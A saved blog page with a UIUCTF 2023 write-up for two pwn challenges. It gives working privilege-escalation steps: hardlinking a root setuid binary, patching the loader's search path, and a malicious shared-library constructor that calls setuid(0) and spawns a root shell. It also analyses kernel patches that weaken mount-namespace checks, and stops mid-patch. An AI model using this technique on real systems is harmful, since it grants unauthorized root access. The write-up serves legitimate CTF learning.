@@ -1,0 +1,417 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="At UIUCTF 2023, I played with Project Sekai CTF team. We achieved 3rd place overall. Below is my writeup for some pwn challenges in the CTF.
+Zapping a Setuid 1 I was reading how Zapps work the other day and I thought I could do better. However, what happens when a setuid was zapped?
+Hint:
+Oops I left CVE-2009-0876 open.
+Looking around the VM, we saw a directory with a setuid binary named exe:"><title>UIUCTF 2023 Writeups</title><link rel=canonical href=https://nyancat0131.moe/post/ctf-writeups/uiu-ctf/2023/writeup/><link rel=stylesheet href=/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css><meta property="og:title" content="UIUCTF 2023 Writeups"><meta property="og:description" content="At UIUCTF 2023, I played with Project Sekai CTF team. We achieved 3rd place overall. Below is my writeup for some pwn challenges in the CTF.
+Zapping a Setuid 1 I was reading how Zapps work the other day and I thought I could do better. However, what happens when a setuid was zapped?
+Hint:
+Oops I left CVE-2009-0876 open.
+Looking around the VM, we saw a directory with a setuid binary named exe:"><meta property="og:url" content="https://nyancat0131.moe/post/ctf-writeups/uiu-ctf/2023/writeup/"><meta property="og:site_name" content="nyancat0131"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="ctf"><meta property="article:tag" content="pwn"><meta property="article:published_time" content="2023-07-06T00:00:01+00:00"><meta property="article:modified_time" content="2023-07-06T00:00:01+00:00"><meta name=twitter:title content="UIUCTF 2023 Writeups"><meta name=twitter:description content="At UIUCTF 2023, I played with Project Sekai CTF team. We achieved 3rd place overall. Below is my writeup for some pwn challenges in the CTF.
+Zapping a Setuid 1 I was reading how Zapps work the other day and I thought I could do better. However, what happens when a setuid was zapped?
+Hint:
+Oops I left CVE-2009-0876 open.
+Looking around the VM, we saw a directory with a setuid binary named exe:"></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column compact"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu260f869a3420d3019dc323e7e1531f15_75787_300x0_resize_box_3.png width=300 height=318 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>nyancat0131</a></h1><h2 class=site-description></h2></div></header><ol class=social-menu><li><a href=https://www.facebook.com/nyancat0131 target=_blank title=Facebook rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-facebook" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="#2c3e50" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 10v4h3v7h4v-7h3l1-4h-4V8a1 1 0 011-1h3V3h-3a5 5 0 00-5 5v2H7"/></svg></a></li><li><a href=https://twitter.com/bienpnn target=_blank title=Twitter rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li><li><a href=https://github.com/kungfulon target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><div class=menu-bottom-section><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>Dark Mode</span></li></div></ol></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/post/ctf-writeups/uiu-ctf/2023/writeup/>UIUCTF 2023 Writeups</a></h2></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Jul 06, 2023</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>14 minute read</time></div></footer></div></header><section class=article-content><p>At UIUCTF 2023, I played with <a class=link href=https://twitter.com/ProjectSEKAIctf target=_blank rel=noopener>Project Sekai CTF team</a>. We achieved 3rd place overall.
+Below is my writeup for some pwn challenges in the CTF.</p><h2 id=zapping-a-setuid-1>Zapping a Setuid 1</h2><blockquote><p>I was reading <a class=link href=https://zapps.app/technology/ target=_blank rel=noopener>how Zapps work</a> the other day and I thought I could <a class=link href=https://github.com/warptools/ldshim/issues/1 target=_blank rel=noopener>do better</a>. However, what happens when a setuid was zapped?</p></blockquote><p>Hint:</p><blockquote><p>Oops I left <a class=link href=https://bugs.gentoo.org/260331 target=_blank rel=noopener>CVE-2009-0876</a> open.</p></blockquote><p>Looking around the VM, we saw a directory with a <code>setuid</code> binary named <code>exe</code>:</p><pre tabindex=0><code>uiuctf-2023:~/zapps/build$ ls -la
+total 2456
+drwxr-xr-x 1 root root      76 Jun 19 18:12 .
+drwxr-xr-x 1 root root      16 Jun 20 16:35 ..
+-rwsr-xr-x 1 root root   31280 Jun 19 18:12 exe
+-rwxr-xr-x 1 root root  240936 Jun 19 18:12 ld-linux-x86-64.so.2
+-rwxr-xr-x 1 root root   17464 Jun 19 18:12 lib.so
+-rw-r--r-- 1 root root 2216304 Jun 19 18:12 libc.so.6
+</code></pre><p>Some background on <code>setuid</code> binary: If a binary has <code>setuid</code> flag set, when an user execute that binary normally, the process will have privileges of the file&rsquo;s <strong>owner</strong>.
+For example <code>sudo</code> uses this feature in order to run commands with <code>root</code> privileges after checking current user&rsquo;s permissions.</p><p>Running the <code>exe</code>, we got the following output:</p><pre tabindex=0><code>uiuctf-2023:~/zapps/build$ ./exe
+static_constructor in lib invoked
+static_constructor in exe invoked
+main invoked with arguments:
+argv[0] = ./exe
+foo invoked
+contents of /proc/self/maps:
+555555fbf000-555555fe0000 rw-p 00000000 00:00 0                          [heap]
+7f53d7218000-7f53d721b000 rw-p 00000000 00:00 0
+7f53d721b000-7f53d7243000 r--p 00000000 00:0f 296643                     /usr/lib/zapps/build/libc.so.6
+7f53d7243000-7f53d73d8000 r-xp 00028000 00:0f 296643                     /usr/lib/zapps/build/libc.so.6
+7f53d73d8000-7f53d7430000 r--p 001bd000 00:0f 296643                     /usr/lib/zapps/build/libc.so.6
+7f53d7430000-7f53d7434000 r--p 00214000 00:0f 296643                     /usr/lib/zapps/build/libc.so.6
+7f53d7434000-7f53d7436000 rw-p 00218000 00:0f 296643                     /usr/lib/zapps/build/libc.so.6
+7f53d7436000-7f53d7443000 rw-p 00000000 00:00 0
+7f53d7443000-7f53d7444000 r--p 00000000 00:0f 296642                     /usr/lib/zapps/build/lib.so
+7f53d7444000-7f53d7445000 r-xp 00001000 00:0f 296642                     /usr/lib/zapps/build/lib.so
+7f53d7445000-7f53d7446000 r--p 00002000 00:0f 296642                     /usr/lib/zapps/build/lib.so
+7f53d7446000-7f53d7447000 r--p 00002000 00:0f 296642                     /usr/lib/zapps/build/lib.so
+7f53d7447000-7f53d7448000 rw-p 00003000 00:0f 296642                     /usr/lib/zapps/build/lib.so
+7f53d7448000-7f53d744a000 rw-p 00000000 00:00 0
+7f53d744a000-7f53d744c000 r--p 00000000 00:0f 296641                     /usr/lib/zapps/build/ld-linux-x86-64.so.2
+7f53d744c000-7f53d7476000 r-xp 00002000 00:0f 296641                     /usr/lib/zapps/build/ld-linux-x86-64.so.2
+7f53d7476000-7f53d7481000 r--p 0002c000 00:0f 296641                     /usr/lib/zapps/build/ld-linux-x86-64.so.2
+7f53d7481000-7f53d7482000 ---p 00000000 00:00 0
+7f53d7482000-7f53d7484000 r--p 00037000 00:0f 296641                     /usr/lib/zapps/build/ld-linux-x86-64.so.2
+7f53d7484000-7f53d7486000 rw-p 00039000 00:0f 296641                     /usr/lib/zapps/build/ld-linux-x86-64.so.2
+7f53d7486000-7f53d7487000 r--p 00000000 00:0f 296640                     /usr/lib/zapps/build/exe
+7f53d7487000-7f53d7488000 r-xp 00001000 00:0f 296640                     /usr/lib/zapps/build/exe
+7f53d7488000-7f53d7489000 r--p 00002000 00:0f 296640                     /usr/lib/zapps/build/exe
+7f53d7489000-7f53d748a000 r--p 00002000 00:0f 296640                     /usr/lib/zapps/build/exe
+7f53d748a000-7f53d748b000 rw-p 00003000 00:0f 296640                     /usr/lib/zapps/build/exe
+7ffd50913000-7ffd50934000 rw-p 00000000 00:00 0                          [stack]
+7ffd50996000-7ffd5099a000 r--p 00000000 00:00 0                          [vvar]
+7ffd5099a000-7ffd5099c000 r-xp 00000000 00:00 0                          [vdso]
+</code></pre><p>From the output, we can see that the <code>exe</code> loads <code>lib.so</code>, <code>libc.so.6</code> and <code>ld-linux-x86-64.so.2</code>.
+That means if we can compromise one of those, we can execute code with <code>root</code> privileges since <code>exe</code> is a <code>setuid</code> binary with <code>root</code> as owner.
+The problem is we cannot write to <code>/usr/lib/zapps/build/</code>. It&rsquo;s time to look at the report mentioned in the hint:</p><blockquote><p>&mldr; hardlinks on Linux preserve permission, including set*id bits, and can be created by non-root users.</p></blockquote><p>That means if we create a hardlink to <code>/usr/lib/zapps/build/exe</code> at somewhere else, it will still have the <code>setuid</code> bit set. We can create the hardlink using the following command:</p><pre tabindex=0><code>uiuctf-2023:~$ ln /usr/lib/zapps/build/exe
+</code></pre><p>Now copy <code>lib.so</code>, <code>libc.so.6</code> and <code>ld-linux-x86-64.so.2</code> to the same directory with the hard link to do a test run:</p><pre tabindex=0><code>uiuctf-2023:~$ cp /usr/lib/zapps/build/*.so* .
+uiuctf-2023:~$ ls
+exe  init_chal  ld-linux-x86-64.so.2  lib.so  libc.so.6  zapps
+uiuctf-2023:~$ ./exe
+./exe: error while loading shared libraries: lib.so: cannot open shared object file: No such file or directory
+</code></pre><p>Seems like the <code>ld</code> cannot find <code>lib.so</code> in any of the search paths. I decided to just patch one of the search path in <code>ld</code> to <code>/home/user/</code> using this python script:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;ld-linux-x86-64.so.2&#39;</span>, <span style=color:#e6db74>&#39;rb&#39;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>    dat <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>dat <span style=color:#f92672>=</span> dat[:<span style=color:#ae81ff>180311</span>] <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/home/user////////////////&#39;</span> <span style=color:#f92672>+</span> dat[<span style=color:#ae81ff>180337</span>:]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;ld-linux-x86-64.so.2&#39;</span>, <span style=color:#e6db74>&#39;wb&#39;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>    f<span style=color:#f92672>.</span>write(dat)
+</span></span></code></pre></div><p>Now it can run again:</p><pre tabindex=0><code>uiuctf-2023:~$ ./exe
+static_constructor in lib invoked
+static_constructor in exe invoked
+main invoked with arguments:
+argv[0] = ./exe
+foo invoked
+contents of /proc/self/maps:
+555555cb9000-555555cda000 rw-p 00000000 00:00 0                          [heap]
+7f5a1c023000-7f5a1c026000 rw-p 00000000 00:00 0
+7f5a1c026000-7f5a1c04e000 r--p 00000000 00:0f 297376                     /home/user/libc.so.6
+7f5a1c04e000-7f5a1c1e3000 r-xp 00028000 00:0f 297376                     /home/user/libc.so.6
+7f5a1c1e3000-7f5a1c23b000 r--p 001bd000 00:0f 297376                     /home/user/libc.so.6
+7f5a1c23b000-7f5a1c23f000 r--p 00214000 00:0f 297376                     /home/user/libc.so.6
+7f5a1c23f000-7f5a1c241000 rw-p 00218000 00:0f 297376                     /home/user/libc.so.6
+7f5a1c241000-7f5a1c24e000 rw-p 00000000 00:00 0
+7f5a1c24e000-7f5a1c24f000 r--p 00000000 00:0f 297375                     /home/user/lib.so
+7f5a1c24f000-7f5a1c250000 r-xp 00001000 00:0f 297375                     /home/user/lib.so
+7f5a1c250000-7f5a1c251000 r--p 00002000 00:0f 297375                     /home/user/lib.so
+7f5a1c251000-7f5a1c252000 r--p 00002000 00:0f 297375                     /home/user/lib.so
+7f5a1c252000-7f5a1c253000 rw-p 00003000 00:0f 297375                     /home/user/lib.so
+7f5a1c253000-7f5a1c255000 rw-p 00000000 00:00 0
+7f5a1c255000-7f5a1c257000 r--p 00000000 00:0f 297374                     /home/user/ld-linux-x86-64.so.2
+7f5a1c257000-7f5a1c281000 r-xp 00002000 00:0f 297374                     /home/user/ld-linux-x86-64.so.2
+7f5a1c281000-7f5a1c28c000 r--p 0002c000 00:0f 297374                     /home/user/ld-linux-x86-64.so.2
+7f5a1c28c000-7f5a1c28d000 ---p 00000000 00:00 0
+7f5a1c28d000-7f5a1c28f000 r--p 00037000 00:0f 297374                     /home/user/ld-linux-x86-64.so.2
+7f5a1c28f000-7f5a1c291000 rw-p 00039000 00:0f 297374                     /home/user/ld-linux-x86-64.so.2
+7f5a1c291000-7f5a1c292000 r--p 00000000 00:0f 296640                     /home/user/exe
+7f5a1c292000-7f5a1c293000 r-xp 00001000 00:0f 296640                     /home/user/exe
+7f5a1c293000-7f5a1c294000 r--p 00002000 00:0f 296640                     /home/user/exe
+7f5a1c294000-7f5a1c295000 r--p 00002000 00:0f 296640                     /home/user/exe
+7f5a1c295000-7f5a1c296000 rw-p 00003000 00:0f 296640                     /home/user/exe
+7ffdc7547000-7ffdc7568000 rw-p 00000000 00:00 0                          [stack]
+7ffdc75a9000-7ffdc75ad000 r--p 00000000 00:00 0                          [vvar]
+7ffdc75ad000-7ffdc75af000 r-xp 00000000 00:00 0                          [vdso]
+</code></pre><p>I then created a new <code>lib.so</code> using the following C code:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#a6e22e>__attribute__</span>((constructor)) <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>static_constructor</span>(<span style=color:#66d9ef>void</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// Set effective user id of the process to root
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>setuid</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>perror</span>(<span style=color:#e6db74>&#34;setuid&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// Set effective group id of the process to root
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>setgid</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>perror</span>(<span style=color:#e6db74>&#34;setgid&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// Spawn a shell
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>execlp</span>(<span style=color:#e6db74>&#34;/bin/bash&#34;</span>, <span style=color:#e6db74>&#34;bash&#34;</span>, <span style=color:#e6db74>&#34;-l&#34;</span>, NULL);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>foo</span>(<span style=color:#66d9ef>void</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;foo invoked</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Compile it with:</p><pre tabindex=0><code>uiuctf-2023:~$ cc -o lib.so x.c -fPIC -shared
+</code></pre><p>Now we run the <code>exe</code> with our new <code>lib.so</code>:</p><pre tabindex=0><code>uiuctf-2023:~$ ./exe
+setuid: Success
+setgid: Success
+uiuctf-2023:~# id
+uid=0(root) gid=0(root) groups=0(root),1000(user)
+uiuctf-2023:~# cat /mnt/flag
+uiuctf{did-you-see-why-its-in-usr-lib-now-0cd5fb56}
+</code></pre><h2 id=zapping-a-setuid-2>Zapping a Setuid 2</h2><blockquote><p>Ok ok ok, but what if there was another way?</p></blockquote><p>Hint 1:</p><blockquote><p>The &ldquo;zapps&rdquo; symlink is for accessibility. The intended solution does not depend on the symlink.</p></blockquote><p>Hint 2:</p><blockquote><p>The additional patches to this challenge are hints.</p></blockquote><p>To understand this challenge, first we need to know about <a class=link href=https://man7.org/linux/man-pages/man7/namespaces.7.html target=_blank rel=noopener>Linux namespaces</a>.
+For a quick explanation, namespaces are used to create isolated environment.
+Processes inside a namespace can only see and use resources inside that namespace.
+One use of namespaces is to implement containers.</p><p>There are multiple kind of namespaces (click on them to see their <code>man</code> pages):</p><ul><li><a class=link href=https://man7.org/linux/man-pages/man7/user_namespaces.7.html target=_blank rel=noopener>User namespace</a></li><li><a class=link href=https://man7.org/linux/man-pages/man7/mount_namespaces.7.html target=_blank rel=noopener>Mount namespace</a></li><li><a class=link href=https://man7.org/linux/man-pages/man7/network_namespaces.7.html target=_blank rel=noopener>Network namespace</a></li><li><a class=link href=https://man7.org/linux/man-pages/man7/pid_namespaces.7.html target=_blank rel=noopener>PID namespace</a></li><li><a class=link href=https://man7.org/linux/man-pages/man7/cgroup_namespaces.7.html target=_blank rel=noopener>Cgroup namespace</a></li><li><a class=link href=https://man7.org/linux/man-pages/man7/ipc_namespaces.7.html target=_blank rel=noopener>IPC namespace</a></li><li><a class=link href=https://man7.org/linux/man-pages/man7/time_namespaces.7.html target=_blank rel=noopener>Time namespace</a></li><li><a class=link href=https://man7.org/linux/man-pages/man7/uts_namespaces.7.html target=_blank rel=noopener>UTS namespace</a></li></ul><p>In this challenge, <code>protected_hardlinks</code> is enable so <code>user</code> cannot create hard link of <code>exe</code> anymore.
+But the kernel is modified with some patches. Let&rsquo;s analyze them.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span>From 7d26a340113813b6f9064b25f2928c177269d2f5 Mon Sep 17 00:00:00 2001
+</span></span><span style=display:flex><span>From: YiFei Zhu &lt;zhuyifei@google.com&gt;
+</span></span><span style=display:flex><span>Date: Mon, 19 Jun 2023 22:26:16 -0700
+</span></span><span style=display:flex><span>Subject: [PATCH] fs/namespace: Allow generic loopback mount without requiring
+</span></span><span style=display:flex><span> nsfs
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>The argument was flawed and was never agreed upon [1].
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>After 18 years, what could possibly go wrong?
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>[1] https://lore.kernel.org/all/1131563299.5400.392.camel@localhost/T/#t
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Signed-off-by: YiFei Zhu &lt;zhuyifei@google.com&gt;
+</span></span><span style=display:flex><span><span style=font-weight:700>---
+</span></span></span><span style=display:flex><span><span style=font-weight:700></span> fs/namespace.c | 3 ---
+</span></span><span style=display:flex><span> 1 file changed, 3 deletions(-)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>diff --git a/fs/namespace.c b/fs/namespace.c
+</span></span><span style=display:flex><span>index 4f520f800dbc..eb196f016e3f 100644
+</span></span><span style=display:flex><span><span style=color:#f92672>--- a/fs/namespace.c
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/fs/namespace.c
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -2396,9 +2396,6 @@ static struct mount *__do_loopback(struct path *old_path, int recurse)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>     if (IS_MNT_UNBINDABLE(old))
+</span></span><span style=display:flex><span>         return mnt;
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#f92672>-    if (!check_mnt(old) &amp;&amp; old_path-&gt;dentry-&gt;d_op != &amp;ns_dentry_operations)
+</span></span></span><span style=display:flex><span><span style=color:#f92672>-        return mnt;
+</span></span></span><span style=display:flex><span><span style=color:#f92672>-
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span>     if (!recurse &amp;&amp; has_locked_children(old, old_path-&gt;dentry))
+</span></span><span style=display:flex><span>         return mnt;
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#f92672>-- 
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span>2.41.0
+</span></span></code></pre></div><p><code>check_mnt</code> is used to check if the path is in the same mount namespace as the current task&rsquo;s mount namespace.
+By removing this check, the patch allows cross loopback mounting between different mount namespaces.</p><blockquote><p>Mount namespace isolates the mount table. Changes to the mount table inside a namespace will not be visible to other namespaces.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span>From 9946c9e1e098884064df8a394a6ef992c94d21e6 Mon Sep 17 00:00:00 2001
+</span></span><span style=display:flex><span>From: YiFei Zhu &lt;zhuyifei@google.com&gt;
+</span></span><span style=display:flex><span>Date: Mon, 19 Jun 2023 21:39:32 -0700
+</span></span><span style=display:flex><span>Subject: [PATCH] fs/namespace: Allow unpriv OPEN_TREE_CLONE
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>OPEN_TREE_CLONE is only really useful when you could use move_mount()
+</span></span><span style=display:flex><span>to perform a bind mount. Otherwise all you get is an fd equivalent to
+</span></span><span style=display:flex><span>an O_PATH&#39;ed fd that is detached, without a way to modify any
+</span></span><span style=display:flex><span>mountpoints of the current namespace.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>What could possibly go wrong?
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Signed-off-by: YiFei Zhu &lt;zhuyifei@google.com&gt;
+</span></span><span style=display:flex><span><span style=font-weight:700>---
+</span></span></span><span style=display:flex><span><span style=font-weight:700></span> fs/namespace.c | 3 ---
+</span></span><span style=display:flex><span> 1 file changed, 3 deletions(-)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>diff --git a/fs/namespace.c b/fs/namespace.c
+</span></span><span style=display:flex><span>index df137ba19d37..4f520f800dbc 100644
+</span></span><span style=display:flex><span><span style=color:#f92672>--- a/fs/namespace.c
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/fs/namespace.c
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -2527,9 +2527,6 @@ SYSCALL_DEFINE3(open_tree, int, dfd, const char __user *, filename, unsigned, fl
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>     if (flags &amp; AT_EMPTY_PATH)
+</span></span><span style=display:flex><span>         lookup_flags |= LOOKUP_EMPTY;
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#f92672>-    if (detached &amp;&amp; !may_mount())
+</span></span></span><span style=display:flex><span><span style=color:#f92672>-        return -EPERM;
+</span></span></span><span style=display:flex><span><span style=color:#f92672>-
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span>     fd = get_unused_fd_flags(flags &amp; O_CLOEXEC);
+</span></span><span style=display:flex><span>     if (fd &lt; 0)
+</span></span><span style=display:flex><span>         return fd;
+</span></span><span style=display:flex><span><span style=color:#f92672>-- 
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span>2.41.0
+</span></span></code></pre></div><p>This patch allow unprivileged user to call <code>SYS_open_tree</code> with <code>OPEN_TREE_CLONE</code> flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span>From 7bba6f2216c5b757e38cd90f7b12bdf952e316c7 Mon Sep 17 00:00:00 2001
+</span></span><span style=display:flex><span>From: YiFei Zhu &lt;zhuyifei@google.com&gt;
+</span></span><span style=display:flex><span>Date: Mon, 19 Jun 2023 23:04:25 -0700
+</span></span><span style=display:flex><span>Subject: [PATCH] fs/namespace: Check userns instead of mntns in mnt_may_suid
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>If we are in the same userns, I don&#39;t see why we need to check
+</span></span><span style=display:flex><span>if we are in the same mntns too, right?
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Signed-off-by: YiFei Zhu &lt;zhuyifei@google.com&gt;
+</span></span><span style=display:flex><span><span style=font-weight:700>---
+</span></span></span><span style=display:flex><span><span style=font-weight:700></span> fs/namespace.c | 3 ++-
+</span></span><span style=display:flex><span> 1 file changed, 2 insertions(+), 1 deletion(-)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>diff --git a/fs/namespace.c b/fs/namespace.c
+</span></span><span style=display:flex><span>index eb196f016e3f..25757327a82a 100644
+</span></span><span style=display:flex><span><span style=color:#f92672>--- a/fs/namespace.c
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/fs/namespace.c
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -4609,7 +4609,8 @@ bool mnt_may_suid(struct vfsmount *mnt)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      * suid/sgid bits, file caps, or security labels that originate
+</span></span><span style=display:flex><span>      * in other namespaces.
+</span></span><span style=display:flex><span>      */
+</span></span><span style=display:flex><span><span style=color:#f92672>-    return !(mnt-&gt;mnt_flags &amp; MNT_NOSUID) &amp;&amp; check_mnt(real_mount(mnt)) &amp;&amp;
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+    return !(mnt-&gt;mnt_flags &amp; MNT_NOSUID) &amp;&amp;
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+           current_in_userns(real_mount(mnt)-&gt;mnt_ns-&gt;user_ns) &amp;&amp;
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>            current_in_userns(mnt-&gt;mnt_sb-&gt;s_user_ns);
